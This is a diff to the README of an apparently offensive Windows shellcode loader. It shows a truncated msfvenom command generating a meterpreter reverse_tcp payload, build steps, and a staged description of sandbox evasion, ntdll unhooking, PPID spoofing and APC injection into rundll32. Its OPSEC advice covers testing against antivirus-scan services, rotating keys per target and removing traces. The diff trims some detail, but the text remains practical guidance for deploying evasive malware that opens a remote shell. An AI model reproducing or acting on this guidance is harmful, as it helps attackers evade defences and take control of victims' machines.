@@ -33,15 +33,15 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 EXITF
 # 3. Compile
 .\build.ps1
 
-# Result: output\Loader.exe (67 KB, silent, stripped)
+# Result: output\Loader.exe (silent, stripped)
 ```
 
 ## How it works
 
 **Stage 1: Sandbox evasion**
 - Check VM (VMware, VirtualBox, Hyper-V)
-- Verify RAM/CPU/disk (sandboxes often have 2GB RAM, 2 CPUs)
-- Uptime > 10 min (sandbox timeout usually 5 min)
+- Verify RAM/CPU/disk
+- Uptime > 10 min
 
 **Stage 2: Unhooking**
 - Load fresh copy of ntdll.dll from C:\Windows\System32
@@ -54,8 +54,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 EXITF
 
 **Stage 4: Injection**
 - Create rundll32.exe in suspended mode
-- PPID spoofing to explorer.exe (looks legit)
-- Allocate RWX memory with direct syscall
+- PPID spoofing to explorer.exe
+- Allocate RWX memory
 - Write shellcode
 - APC on main thread
 - Resume → shellcode executes
@@ -72,17 +72,10 @@ gcc -O2 -DPRODUCTION loader_v3.c modules\*.c modules\dosyscall.o -o Loader_PROD.
 
 ## OPSEC
 
-**Do:**
 - Test on filescan.io or antiscan.me
 - Change payload per target (rotate AES keys)
 - Check connection: `netstat -ano | findstr <port>`
 - Kill rundll32.exe process after use
-
-**Don't:**
-- Upload to VirusTotal (burns the signature)
-- Reuse same binary on multiple targets
-- Leave traces (payload.bin on disk)
-- Default LHOST/LPORT (192.168.1.100:4444 = obvious)
 
 ## Detection
 
@@ -105,10 +98,6 @@ If `dosyscall.o` missing after cleanup:
 cd modules
 gcc -c dosyscall.S -o dosyscall.o
 ```
-
-If loader gets killed by Kaspersky during testing:
-- Add folder exclusion in AV
-- Compile with `-DPRODUCTION` (disables printf that can trigger)
 
 ## Some good references 
 - https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls
